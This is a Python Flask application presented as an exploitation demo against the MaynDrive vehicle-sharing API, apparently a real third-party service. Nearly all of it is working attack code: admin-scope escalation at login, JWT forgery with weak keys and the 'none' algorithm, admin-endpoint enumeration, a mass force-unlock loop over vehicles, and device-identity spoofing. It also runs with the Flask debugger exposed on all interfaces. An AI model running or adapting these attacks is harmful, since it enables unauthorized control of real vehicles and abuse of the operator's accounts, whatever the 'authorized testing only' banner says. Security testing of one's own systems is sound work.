"""
MaynDrive Security Vulnerability Exploitation Demo
A web application demonstrating how attackers exploit admin access vulnerabilities

‚ö†Ô∏è WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!
Only use against your own test environment with explicit permission.
"""

from flask import Flask, render_template, request, jsonify, session
from mayn_drive_api import MaynDriveAPI
import secrets
import json
from datetime import datetime
import jwt
import requests

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# Store exploitation results
exploitation_log = []


# Global error handlers (simplified)
@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return jsonify({'error': 'Endpoint not found', 'status': 404}), 404


def log_exploitation(attack_type: str, success: bool, details: dict):
    """Log exploitation attempts"""
    exploitation_log.append({
        'timestamp': datetime.now().isoformat(),
        'attack_type': attack_type,
        'success': success,
        'details': details
    })


@app.route('/')
def index():
    """Main page with attack scenarios"""
    return render_template('index.html')


@app.route('/health')
def health():
    """Health check endpoint for Docker"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'service': 'MaynDrive Security Exploitation Demo'
    })


@app.route('/api/test', methods=['GET', 'POST'])
def test_endpoint():
    """Simple test endpoint to verify API is working"""
    return jsonify({
        'status': 'ok',
        'message': 'API is responding correctly',
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/exploit/scope-escalation', methods=['POST'])
def exploit_scope_escalation():
    """
    EXPLOIT #1: Scope Escalation Attack
    
    Demonstrates how an attacker can request admin scope during login
    """
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
            
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'error': 'Email and password required'}), 400
        
        api = MaynDriveAPI(timeout=10)
        
        # ATTACK: Request admin scope as a regular user
        print(f"üéØ ATTACK: Attempting scope escalation for {email}")
        success, login_data = api.login(email, password, scope="admin")
        
        if not success:
            log_exploitation('scope_escalation', False, {
                'email': email,
                'error': str(login_data)
            })
            return jsonify({
                'success': False,
                'message': 'Login failed',
                'details': login_data
            }), 401
        
        # Check if we got admin access
        access_token = api.access_token
        
        # Try to use admin endpoint to confirm
        test_success, test_result = api.unlock_vehicle_admin(
            serial_number="EXPLOIT_TEST",
            latitude=0.0,
            longitude=0.0,
            force=False
        )
        
        exploitation_success = False
        message = ""
        
        if test_success:
            exploitation_success = True
            message = "üö® CRITICAL: Admin access gained! Able to unlock vehicles."
        elif test_result.get('status_code') == 404:
            exploitation_success = True
            message = "‚ö†Ô∏è VULNERABLE: Admin endpoint accessible (404 = endpoint works, vehicle not found)"
        elif test_result.get('status_code') == 403:
            exploitation_success = False
            message = "‚úÖ SECURE: Admin access properly denied (403 Forbidden)"
        else:
            message = f"‚ùì UNCLEAR: Status code {test_result.get('status_code')}"
        
        log_exploitation('scope_escalation', exploitation_success, {
            'email': email,
            'token_received': bool(access_token),
            'admin_endpoint_response': test_result
        })
        
        return jsonify({
            'success': True,
            'vulnerable': exploitation_success,
            'message': message,
            'token': access_token[:30] + '...' if access_token else None,
            'admin_test_result': test_result
        })
        
    except requests.exceptions.Timeout:
        return jsonify({
            'success': False,
            'vulnerable': False,
            'error': 'Request timed out. API server may be unavailable.',
            'message': '‚ö†Ô∏è Connection to API server timed out after 10 seconds. The MaynDrive API server may be down or unreachable.'
        }), 200  # Return 200 so frontend can display the message properly
    except requests.exceptions.ConnectionError:
        return jsonify({
            'success': False,
            'vulnerable': False,
            'error': 'Connection error. Cannot reach API server.',
            'message': '‚ö†Ô∏è Unable to connect to the MaynDrive API. The server at https://api.knotcity.io may be down or blocking requests.'
        }), 200  # Return 200 so frontend can display the message properly
    except Exception as e:
        print(f"ERROR in scope-escalation: {type(e).__name__}: {str(e)}")
        return jsonify({
            'success': False,
            'vulnerable': False,
            'error': str(e),
            'error_type': type(e).__name__,
            'message': f'‚ö†Ô∏è Unexpected error: {str(e)}'
        }), 200  # Return 200 so frontend can display the message properly


@app.route('/api/exploit/token-manipulation', methods=['POST'])
def exploit_token_manipulation():
    """
    EXPLOIT #2: JWT Token Manipulation
    
    Demonstrates JWT token tampering to gain admin access
    """
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    try:
        api = MaynDriveAPI()
        
        # First, login normally as user
        print(f"üéØ ATTACK: Getting user token for {email}")
        success, login_data = api.login(email, password, scope="user")
        
        if not success:
            return jsonify({'error': 'Login failed', 'details': login_data}), 401
        
        original_token = api.access_token
        
        # ATTACK: Try to decode and manipulate the token
        print("üéØ ATTACK: Attempting to decode JWT token...")
        
        try:
            # Decode without verification (attacker technique)
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
            print(f"üìã Original token payload: {json.dumps(payload, indent=2)}")
            
            # ATTACK: Modify the scope/role in payload
            modified_payload = payload.copy()
            
            # Try various admin escalation techniques
            if 'scope' in modified_payload:
                modified_payload['scope'] = 'admin'
            if 'role' in modified_payload:
                modified_payload['role'] = 'admin'
            if 'roles' in modified_payload:
                modified_payload['roles'] = ['admin', 'user']
            
            # Try to add admin fields if they don't exist
            if 'scope' not in modified_payload:
                modified_payload['scope'] = 'admin'
            if 'is_admin' not in modified_payload:
                modified_payload['is_admin'] = True
            
            print(f"üîß Modified payload: {json.dumps(modified_payload, indent=2)}")
            
            # ATTACK VECTOR 1: Try weak signature algorithms
            weak_keys = ['secret', 'SECRET', '123456', 'password', '']
            tampered_tokens = []
            
            for weak_key in weak_keys:
                try:
                    tampered_token = jwt.encode(modified_payload, weak_key, algorithm='HS256')
                    tampered_tokens.append({
                        'method': f'HS256 with key "{weak_key}"',
                        'token': tampered_token
                    })
                except:
                    pass
            
            # ATTACK VECTOR 2: Try "none" algorithm (no signature)
            try:
                # Some JWT libraries accept tokens with no signature
                tampered_token_none = jwt.encode(modified_payload, '', algorithm='none')
                tampered_tokens.append({
                    'method': 'Algorithm "none" (no signature)',
                    'token': tampered_token_none
                })
            except:
                pass
            
            # Test each tampered token against admin endpoint
            exploitation_results = []
            
            for tampered in tampered_tokens:
                test_api = MaynDriveAPI()
                test_api.access_token = tampered['token']
                
                print(f"üéØ Testing tampered token: {tampered['method']}")
                
                success, result = test_api.unlock_vehicle_admin(
                    serial_number="TAMPER_TEST",
                    latitude=0.0,
                    longitude=0.0,
                    force=False
                )
                
                vulnerable = False
                if success or result.get('status_code') == 404:
                    vulnerable = True
                
                exploitation_results.append({
                    'method': tampered['method'],
                    'vulnerable': vulnerable,
                    'response': result
                })
            
            any_vulnerable = any(r['vulnerable'] for r in exploitation_results)
            
            log_exploitation('token_manipulation', any_vulnerable, {
                'email': email,
                'original_payload': payload,
                'modified_payload': modified_payload,
                'results': exploitation_results
            })
            
            return jsonify({
                'success': True,
                'vulnerable': any_vulnerable,
                'original_payload': payload,
                'modified_payload': modified_payload,
                'tampered_tokens_tested': len(tampered_tokens),
                'exploitation_results': exploitation_results
            })
            
        except jwt.DecodeError:
            return jsonify({
                'success': True,
                'vulnerable': False,
                'message': 'Token could not be decoded (good - may be encrypted or non-JWT)'
            })
            
    except requests.exceptions.Timeout:
        return jsonify({
            'success': False,
            'vulnerable': False,
            'error': 'Request timed out',
            'message': '‚ö†Ô∏è Connection to API server timed out. The MaynDrive API server may be down or unreachable.'
        }), 200
    except requests.exceptions.ConnectionError:
        return jsonify({
            'success': False,
            'vulnerable': False,
            'error': 'Connection failed',
            'message': '‚ö†Ô∏è Unable to connect to the MaynDrive API. The server may be down or blocking requests.'
        }), 200
    except Exception as e:
        print(f"ERROR: {type(e).__name__}: {str(e)}")
        return jsonify({
            'success': False,
            'vulnerable': False,
            'error': str(e),
            'error_type': type(e).__name__,
            'message': f'‚ö†Ô∏è Unexpected error: {str(e)}'
        }), 200


@app.route('/api/exploit/endpoint-enumeration', methods=['POST'])
def exploit_endpoint_enumeration():
    """
    EXPLOIT #3: Admin Endpoint Enumeration & Direct Access
    
    Demonstrates discovering and accessing admin endpoints
    """
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    try:
        api = MaynDriveAPI()
        
        # Login as regular user
        print(f"üéØ ATTACK: Enumerating admin endpoints for {email}")
        success, login_data = api.login(email, password, scope="user")
        
        if not success:
            return jsonify({'error': 'Login failed'}), 401
        
        # ATTACK: Try to access known admin endpoints with user token
        admin_endpoints = [
            {
                'name': 'Admin Unlock',
                'method': lambda: api.unlock_vehicle_admin("TEST001", 0.0, 0.0, force=False),
                'impact': 'Can unlock any vehicle in fleet'
            },
            {
                'name': 'Admin Vehicle Info',
                'method': lambda: api.get_vehicle_info("TEST001", admin=True),
                'impact': 'Access sensitive vehicle diagnostics'
            },
            {
                'name': 'Admin IoT Refresh',
                'method': lambda: api.refresh_vehicle_admin("TEST001"),
                'impact': 'Can force IoT data refresh'
            },
            {
                'name': 'Admin Lock',
                'method': lambda: api.lock_vehicle_admin("TEST001", 0.0, 0.0),
                'impact': 'Can lock any vehicle remotely'
            },
            {
                'name': 'Admin Identify',
                'method': lambda: api.identify_vehicle_admin("TEST001"),
                'impact': 'Can make any vehicle beep/flash'
            },
            {
                'name': 'Vehicle Settings Update',
                'method': lambda: api.update_vehicle_settings("TEST001", {"test": True}),
                'impact': 'Can modify vehicle configuration'
            },
            {
                'name': 'Battery Compartment',
                'method': lambda: api.open_battery_compartment("TEST001"),
                'impact': 'Can open battery compartments'
            }
        ]
        
        results = []
        vulnerable_count = 0
        
        for endpoint in admin_endpoints:
            print(f"üéØ Testing: {endpoint['name']}")
            
            try:
                success, response = endpoint['method']()
                
                vulnerable = False
                status = "Unknown"
                
                if success:
                    vulnerable = True
                    status = "CRITICAL: Fully accessible"
                    vulnerable_count += 1
                elif response.get('status_code') == 404:
                    vulnerable = True
                    status = "VULNERABLE: Endpoint accessible (404)"
                    vulnerable_count += 1
                elif response.get('status_code') == 403:
                    status = "SECURE: Access denied (403)"
                elif response.get('status_code') == 401:
                    status = "SECURE: Unauthorized (401)"
                else:
                    status = f"Status: {response.get('status_code')}"
                
                results.append({
                    'endpoint': endpoint['name'],
                    'vulnerable': vulnerable,
                    'status': status,
                    'impact': endpoint['impact'],
                    'response_code': response.get('status_code')
                })
                
            except Exception as e:
                results.append({
                    'endpoint': endpoint['name'],
                    'vulnerable': False,
                    'status': f"Error: {str(e)}",
                    'impact': endpoint['impact']
                })
        
        log_exploitation('endpoint_enumeration', vulnerable_count > 0, {
            'email': email,
            'endpoints_tested': len(admin_endpoints),
            'vulnerable_endpoints': vulnerable_count,
            'results': results
        })
        
        return jsonify({
            'success': True,
            'endpoints_tested': len(admin_endpoints),
            'vulnerable_endpoints': vulnerable_count,
            'vulnerable': vulnerable_count > 0,
            'results': results
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/exploit/mass-unlock', methods=['POST'])
def exploit_mass_unlock():
    """
    EXPLOIT #4: Mass Vehicle Unlock Attack
    
    Demonstrates how an attacker could unlock multiple vehicles
    """
    data = request.json
    email = data.get('email')
    password = data.get('password')
    vehicle_serials = data.get('vehicles', [])
    
    if not vehicle_serials:
        vehicle_serials = [f"TEST_VEHICLE_{i:03d}" for i in range(1, 11)]
    
    try:
        api = MaynDriveAPI()
        
        # ATTACK: Try to get admin access
        print(f"üéØ ATTACK: Attempting mass vehicle unlock")
        success, login_data = api.login(email, password, scope="admin")
        
        if not success:
            return jsonify({'error': 'Login failed'}), 401
        
        # ATTACK: Try to unlock multiple vehicles
        results = []
        successful_unlocks = 0
        
        for serial in vehicle_serials[:10]:  # Limit to 10 for demo
            print(f"üéØ Attempting to unlock: {serial}")
            
            success, response = api.unlock_vehicle_admin(
                serial_number=serial,
                latitude=40.7128,  # NYC coordinates
                longitude=-74.0060,
                force=True  # Force unlock even if in use
            )
            
            if success:
                successful_unlocks += 1
                results.append({
                    'serial': serial,
                    'status': 'UNLOCKED',
                    'vulnerable': True
                })
            elif response.get('status_code') == 404:
                results.append({
                    'serial': serial,
                    'status': 'Endpoint accessible (vehicle not found)',
                    'vulnerable': True
                })
            else:
                results.append({
                    'serial': serial,
                    'status': f"Failed: {response.get('status_code')}",
                    'vulnerable': False
                })
        
        log_exploitation('mass_unlock', successful_unlocks > 0, {
            'email': email,
            'vehicles_attempted': len(vehicle_serials),
            'successful_unlocks': successful_unlocks,
            'results': results
        })
        
        return jsonify({
            'success': True,
            'vulnerable': successful_unlocks > 0 or any(r['vulnerable'] for r in results),
            'vehicles_attempted': len(results),
            'successful_unlocks': successful_unlocks,
            'results': results,
            'impact': f"Attacker could unlock {successful_unlocks} vehicles without authorization!"
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/exploit/device-spoofing', methods=['POST'])
def exploit_device_spoofing():
    """
    EXPLOIT #5: Device Information Spoofing
    
    Demonstrates bypassing device-based security controls
    """
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    try:
        import requests
        import uuid
        
        api = MaynDriveAPI()
        
        # ATTACK: Create multiple fake devices
        fake_devices = [
            {
                'name': 'Attacker Device 1',
                'uuid': '00000000-0000-0000-0000-000000000001',
                'platform': 'attacker_os',
                'manufacturer': 'HACKER',
                'model': 'Exploit Device',
                'os_version': '99.9',
                'app_version': '0.0.1'
            },
            {
                'name': 'Cloned Device',
                'uuid': str(uuid.uuid4()),
                'platform': 'android',
                'manufacturer': 'Cloned',
                'model': 'Pixel 5',
                'os_version': '13',
                'app_version': '1.1.34'
            },
            {
                'name': 'Null Device',
                'uuid': '00000000-0000-0000-0000-000000000000',
                'platform': '',
                'manufacturer': '',
                'model': '',
                'os_version': '',
                'app_version': ''
            }
        ]
        
        results = []
        successful_bypasses = 0
        
        for fake_device in fake_devices:
            print(f"üéØ Testing device spoofing: {fake_device['name']}")
            
            payload = {
                'email': email,
                'password': password,
                'device': {k: v for k, v in fake_device.items() if k != 'name'},
                'scope': 'user',
                'app_label': 'mayndrive'
            }
            
            try:
                response = requests.post(
                    f"{api.base_url}/api/application/login",
                    json=payload,
                    headers={
                        'User-Agent': 'Exploit/1.0',
                        'Content-Type': 'application/json'
                    },
                    timeout=30
                )
                
                if response.status_code == 200:
                    successful_bypasses += 1
                    results.append({
                        'device': fake_device['name'],
                        'accepted': True,
                        'status': 'VULNERABLE: Fake device accepted'
                    })
                else:
                    results.append({
                        'device': fake_device['name'],
                        'accepted': False,
                        'status': f'Rejected: {response.status_code}'
                    })
                    
            except Exception as e:
                results.append({
                    'device': fake_device['name'],
                    'accepted': False,
                    'status': f'Error: {str(e)}'
                })
        
        log_exploitation('device_spoofing', successful_bypasses > 0, {
            'email': email,
            'devices_tested': len(fake_devices),
            'successful_bypasses': successful_bypasses,
            'results': results
        })
        
        return jsonify({
            'success': True,
            'vulnerable': successful_bypasses > 0,
            'devices_tested': len(fake_devices),
            'successful_bypasses': successful_bypasses,
            'results': results
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/exploitation-log')
def get_exploitation_log():
    """Get log of all exploitation attempts"""
    return jsonify({
        'total_attempts': len(exploitation_log),
        'log': exploitation_log[-50:]  # Last 50 entries
    })


@app.route('/api/clear-log', methods=['POST'])
def clear_log():
    """Clear exploitation log"""
    global exploitation_log
    exploitation_log = []
    return jsonify({'success': True})


if __name__ == '__main__':
    print("""
    ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
    ‚ïë   MaynDrive Security Exploitation Demo                   ‚ïë
    ‚ïë                                                            ‚ïë
    ‚ïë   ‚ö†Ô∏è  WARNING: FOR AUTHORIZED TESTING ONLY!               ‚ïë
    ‚ïë                                                            ‚ïë
    ‚ïë   This tool demonstrates real attack vectors.            ‚ïë
    ‚ïë   Only use on systems you own or have permission to test.‚ïë
    ‚ïë                                                            ‚ïë
    ‚ïë   Running at: http://localhost:5000                       ‚ïë
    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
    """)
    
    app.run(debug=True, host='0.0.0.0', port=5000)

